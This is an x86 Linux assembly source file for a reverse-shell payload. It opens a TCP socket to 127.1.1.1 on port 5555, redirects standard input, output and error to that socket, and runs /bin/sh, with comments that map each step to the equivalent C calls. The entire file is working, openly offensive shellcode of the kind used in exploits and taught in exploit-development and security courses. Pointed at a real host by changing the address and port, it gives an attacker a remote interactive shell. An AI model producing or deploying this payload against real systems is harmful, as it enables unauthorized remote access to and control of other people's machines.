;Simple ASM (x86) reverse shell for 127.1.1.1 on port 5555
global _start

_start:
;set the frame pointer
mov ebp, esp

;initialize registers to NULL
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;struct sockaddr_in struct
;struct sockaddr_in {
;	short	sin_family;
;	u_short	sin_port;
;	struct	in_addr sin_addr;
;	char	sin_zero[8];
;};
push eax
push eax            ;padding for sin_zero sockaddr_in struct
push 0x0101017f     ;initialize ip address to 127.1.1.1 
push word 0xb315    ;port number initialize to 5555
push word 0x02      ;network family initialize for IPv4

;s = socket(AF_INET, SOCK_STREAM, 0);
mov ax, 0x167       ;system call number for socket
mov bl, 0x02        ;IPv4 family adress
mov cl, 0x01        ;TCP socket
int 0x80            ;go for it
mov esi, eax        ;move return value (file descriptor) into esi

;connect(s, (struct sockaddr *)&sa, sizeof(sa));
xor eax, eax
mov ax, 0x16a       ;connect system call number
mov ebx, esi        ;file descriptor
mov ecx, esp        ;point to the struct present in the stack
mov edi, ebp        ;used to get the size of the structure
sub edi, esp        ;used to get the size of the structure
mov edx, edi        ;get the size of the struct by using a simple soustraction
int 0x80            ;go for it

;for (int i = 0; i < 3; i++)
;{
;    dup2(connfd, i);
;}
xor ecx, ecx
mov cl, 3
boucle:
    xor eax, eax
    mov al, 0x3f    ;dup system call number
    mov ebx, esi    ;mov the fd variable in ebx
    dec cl          ;dec to cl 1
    int 0x80        ;go for it
    inc cl          ;inc to cl 1
    loop boucle

;execve("/bin/sh", 0, 0);
xor eax, eax
push eax ;push a NULL byte
push 0x68732f2f     ;push /bin//sh
push 0x6e69622f     ;push /bin//sh
mov ebx, esp        ;mov the adress of "/bin//sh" in ebx
xor ecx, ecx        ;initialize ecx to NULL
xor edx, edx        ;initialize edx to NULL
mov al, 0xb         ;system call number for execve
int 0x80            ;go for it